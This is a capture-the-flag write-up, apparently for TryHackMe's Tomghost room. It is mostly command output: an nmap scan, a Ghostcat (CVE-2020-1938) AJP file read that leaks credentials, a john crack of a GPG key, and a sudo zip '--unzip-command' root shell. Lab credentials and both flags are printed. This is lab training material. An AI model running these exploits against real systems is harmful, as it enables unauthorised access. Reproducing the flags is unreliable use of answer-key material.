		
		
		

**Enumeration**

**NMAP**

`
ashik@whitedevil:~$ nmap -sC -sV 10.10.133.135  
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-16 10:40 IST  
Nmap scan report for 10.10.133.135  
Host is up (0.36s latency).  
Not shown: 996 closed ports  
PORT     STATE SERVICE    VERSION  
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)  
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)  
|\_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)  
53/tcp   open  tcpwrapped  
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)  
| ajp-methods:    
|\_  Supported methods: GET HEAD POST OPTIONS  
8080/tcp open  http       Apache Tomcat 9.0.30  
|\_http-favicon: Apache Tomcat  
|\_http-title: Apache Tomcat/9.0.30  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 85.62 seconds
`

https://github.com/00theway/Ghostcat-CNVD-2020-10487

**AJPSHOOTER**

`
ashik@whitedevil:~/Downloads/Tools/Ghostcat-CNVD-2020-10487-master$ python3 ajpShooter.py http://10.10.133.135:8080 8009 /WEB-INF/web.xml rea  
d  
  
   
  *
\[<\] 200 200  
\[<\] Accept-Ranges: bytes  
\[<\] ETag: W/"1261-1583902632000"  
\[<\] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT  
\[<\] Content-Type: application/xml  
\[<\] Content-Length: 1261  
  
<?xml version="1.0" encoding="UTF-8"?>  
<!--  
Licensed to the Apache Software Foundation (ASF) under one or more  
 contributor license agreements.  See the NOTICE file distributed with  
 this work for additional information regarding copyright ownership.  
 The ASF licenses this file to You under the Apache License, Version 2.0  
 (the "License"); you may not use this file except in compliance with  
 the License.  You may obtain a copy of the License at  
  
     http://www.apache.org/licenses/LICENSE-2.0  
  
 Unless required by applicable law or agreed to in writing, software  
 distributed under the License is distributed on an "AS IS" BASIS,  
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  
 See the License for the specific language governing permissions and  
 limitations under the License.  
\-->  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee  
                     http://xmlns.jcp.org/xml/ns/javaee/web-app\_4\_0.xsd"  
 version="4.0"  
 metadata-complete="true">  
  
 <display-name>Welcome to Tomcat</display-name>  
 <description>  
    Welcome to GhostCat  
       skyfuck:8730281lkjlkjdqlksalks  
 </description>  
  
</web-app>
`

**CRACKING the gpg keys **

`
root@ip-10-10-30-103:~\# cat hash   
hackme:$gpg$\*17\*54\*3072\*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be\*3\*254\*2\*  
9\*16\*0c99d5dae8216f2155ba2abfcc71f818\*65536\*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc  
  

root@ip-10-10-30-103:~\# locate rockyou.txt  
/usr/share/wordlists/rockyou.txt  


root@ip-10-10-30-103:~\# john --wordlist=/usr/share/wordlists/rockyou.txt hash   
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"  
Use the "--format=gpg-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key \[32/64\])  
Cost 1 (s2k-count) is 65536 for all loaded hashes  
Cost 2 (hash algorithm \[1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224\]) is 2 for all loaded hashes  
Cost 3 (cipher algorithm \[1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256  
\]) is 9 for all loaded hashes  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
alexandru (hackme)  
1g 0:00:00:00 DONE (2021-06-16 07:09) 4.761g/s 5104p/s 5104c/s 5104C/s chinita..alexandru  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.    
root@ip-10-10-30-103:~#

`

**Decrypting the file**

`
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp   
  
You need a passphrase to unlock the secret key for  
user: "tryhackme <stuxnet@tryhackme.com>"  
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)  
  
gpg: gpg-agent is not available in this session  
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences  
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11  
     "tryhackme <stuxnet@tryhackme.com>"  
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$
`



**Privilegae escalation**

`
merlin@ubuntu:~$ touch a.txt  
merlin@ubuntu:~$ sudo zip a.txt -T --unzip-command="sh -c /bin/bash"  
       zip warning: missing end signature--probably not a zip file (did you  
       zip warning: remember to use binary mode when you transferred it?)  
       zip warning: (if you are trying to read a damaged archive try -F)  
  
zip error: Zip file structure invalid (a.txt)  
merlin@ubuntu:~$ ls  
a.txt  user.txt  
merlin@ubuntu:~$ cat user.txt   
THM{GhostCat\_1s\_so\_cr4sy}  
merlin@ubuntu:~$ sudo aip z.zip z.txt -T --unzip-command="sh -c /bin/bash"  
\[sudo\] password for merlin:    
sudo: aip: command not found  
merlin@ubuntu:~$ sudo zip z.zip z.txt -T --unzip-command="sh -c /bin/bash"   
       zip warning: name not matched: z.txt  
  
zip error: Nothing to do! (z.zip)  
merlin@ubuntu:~$ sudo zip a.zip a.txt -T --unzip-command="sh -c /bin/bash"   
 adding: a.txt (stored 0%)  
root@ubuntu:~\# id  
uid=0(root) gid=0(root) groups=0(root)  
root@ubuntu:~\# ls  
a.txt  user.txt  zi1DMu0r  
root@ubuntu:~\# cd root  
bash: cd: root: No such file or directory  
root@ubuntu:~\# cd /root/  
root@ubuntu:/root\# ls  
root.txt  ufw  
root@ubuntu:/root\# cat root.txt   
THM{Z1P\_1S\_FAKE}  
root@ubuntu:/root#
`


WRITE-UPs

https://muirlandoracle.co.uk/2020/04/11/tomghost-write-up/

https://www.cybergoat.co.uk/writeup/Tomghost-TryHackMe/

https://medium.com/@sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23